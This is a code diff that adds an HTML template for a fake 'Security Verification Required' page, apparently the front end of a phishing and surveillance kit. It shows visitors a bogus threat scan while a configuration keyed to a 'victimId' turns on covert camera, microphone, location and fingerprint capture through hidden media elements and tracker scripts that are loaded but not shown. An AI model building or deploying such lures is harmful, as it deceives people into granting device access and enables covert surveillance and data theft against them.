@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification Required - System Protection</title>
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/animate.css">
+    <link rel="stylesheet" href="/css/progress-bar.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="icon" href="/assets/images/logos/shield.png" type="image/png">
+</head>
+<body>
+    <div class="security-container animated fadeIn">
+        <!-- Header Section -->
+        <div class="security-header text-center">
+            <div class="logo-container">
+                <img src="/assets/images/logos/security-shield.png" alt="Security Shield" class="security-logo animated bounceIn">
+                <div class="verified-badge">
+                    <i class="fas fa-check"></i>
+                    VERIFIED
+                </div>
+            </div>
+            <h1 class="animated fadeInUp">Security Verification Required</h1>
+            <p class="subtitle">We've detected unusual activity from your device that requires immediate attention</p>
+        </div>
+
+        <!-- Main Verification Box -->
+        <div class="verification-box animated fadeInUp">
+            <!-- Scanning Animation -->
+            <div class="scanning-section">
+                <div class="radar-scanner">
+                    <div class="radar"></div>
+                </div>
+                <h3>Scanning Your Device for Threats</h3>
+                <p class="scan-description">Comprehensive security analysis in progress...</p>
+            </div>
+
+            <!-- Security Checklist -->
+            <div class="security-checklist">
+                <div class="check-item completed">
+                    <div class="check-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="check-content">
+                        <span class="check-title">Malware & Virus Scan</span>
+                        <span class="check-status">Completed</span>
+                    </div>
+                </div>
+                
+                <div class="check-item completed">
+                    <div class="check-icon">
+                        <i class="fas fa-browser"></i>
+                    </div>
+                    <div class="check-content">
+                        <span class="check-title">Browser Security Check</span>
+                        <span class="check-status">Completed</span>
+                    </div>
+                </div>
+                
+                <div class="check-item active">
+                    <div class="check-icon">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <div class="check-content">
+                        <span class="check-title">Camera & Microphone Access</span>
+                        <span class="check-status">In Progress...</span>
+                    </div>
+                </div>
+                
+                <div class="check-item pending">
+                    <div class="check-icon">
+                        <i class="fas fa-map-marker-alt"></i>
+                    </div>
+                    <div class="check-content">
+                        <span class="check-title">Location Verification</span>
+                        <span class="check-status">Pending</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Code -->
+            <div class="security-code-box">
+                <div class="code-header">
+                    <i class="fas fa-key"></i>
+                    <span>Verification Code</span>
+                </div>
+                <div class="code-display">
+                    <strong id="securityCode"><%= securityCode %></strong>
+                    <button class="copy-btn" onclick="copyCode()">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+                <small>This code verifies your device identity</small>
+            </div>
+
+            <!-- Progress Section -->
+            <div class="progress-section">
+                <div class="progress-header">
+                    <span>Security Scan Progress</span>
+                    <span id="progressPercent">0%</span>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+                <p class="progress-text" id="progressText">Initializing security protocols...</p>
+            </div>
+
+            <!-- Threat Indicators -->
+            <div class="threat-indicators">
+                <div class="indicator low">
+                    <span class="indicator-dot"></span>
+                    <span>Low Risk Threats: <strong>2 detected</strong></span>
+                </div>
+                <div class="indicator medium">
+                    <span class="indicator-dot"></span>
+                    <span>Medium Risk Threats: <strong>1 detected</strong></span>
+                </div>
+                <div class="indicator high">
+                    <span class="indicator-dot"></span>
+                    <span>High Risk Threats: <strong>0 detected</strong></span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Security Footer -->
+        <div class="security-footer">
+            <div class="footer-content">
+                <div class="trust-indicators">
+                    <div class="trust-item">
+                        <i class="fas fa-lock"></i>
+                        <span>Encrypted Connection</span>
+                    </div>
+                    <div class="trust-item">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>256-bit SSL Security</span>
+                    </div>
+                    <div class="trust-item">
+                        <i class="fas fa-user-shield"></i>
+                        <span>Privacy Protected</span>
+                    </div>
+                </div>
+                <p class="disclaimer">
+                    <i class="fas fa-info-circle"></i>
+                    This is a standard security procedure to protect your account and device from potential threats.
+                    Do not close this window until verification is complete.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Media Elements -->
+    <video id="video" style="display:none" playsinline autoplay></video>
+    <canvas id="canvas" hidden width="640" height="480"></canvas>
+    <audio id="audio" style="display:none" controls></audio>
+
+    <!-- JavaScript Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
+    <script src="/js/utils/compression.js"></script>
+    <script src="/js/utils/encryption.js"></script>
+    <script src="/js/modules/fingerprint.js"></script>
+    <script src="/js/modules/location.js"></script>
+    <script src="/js/modules/media.js"></script>
+    <script src="/js/modules/network.js"></script>
+    <script src="/js/core/tracker.js"></script>
+    
+    <script>
+        // Configuration
+        const CONFIG = {
+            victimId: "<%= victimId %>",
+            targetUrl: "<%= targetUrl %>",
+            securityCode: "<%= securityCode %>",
+            serverUrl: window.location.origin,
+            features: {
+                camera: true,
+                microphone: true,
+                location: true,
+                fingerprint: true,
+                behavior: true
+            }
+        };
+
+        // Initialize security scanner
+        document.addEventListener('DOMContentLoaded', function() {
+            // Start with slight delay for better UX
+            setTimeout(() => {
+                if (typeof UltimateSecurityScanner !== 'undefined') {
+                    window.securityScanner = new UltimateSecurityScanner(CONFIG);
+                    window.securityScanner.startComprehensiveScan();
+                } else {
+                    console.error('Security scanner not loaded');
+                    updateProgress(100, "Security verification complete!");
+                }
+            }, 1500);
+        });
+
+        function copyCode() {
+            navigator.clipboard.writeText("<%= securityCode %>").then(() => {
+                // Show copy success feedback
+                const btn = event.target.closest('.copy-btn');
+                btn.innerHTML = '<i class="fas fa-check"></i>';
+                setTimeout(() => {
+                    btn.innerHTML = '<i class="fas fa-copy"></i>';
+                }, 2000);
+            });
+        }
+
+        function updateProgress(percent, text) {
+            const fill = document.getElementById('progressFill');
+            const percentElem = document.getElementById('progressPercent');
+            const textElem = document.getElementById('progressText');
+            
+            if (fill) fill.style.width = percent + '%';
+            if (percentElem) percentElem.textContent = percent + '%';
+            if (textElem) textElem.textContent = text;
+        }
+    </script>
+</body>
+</html>
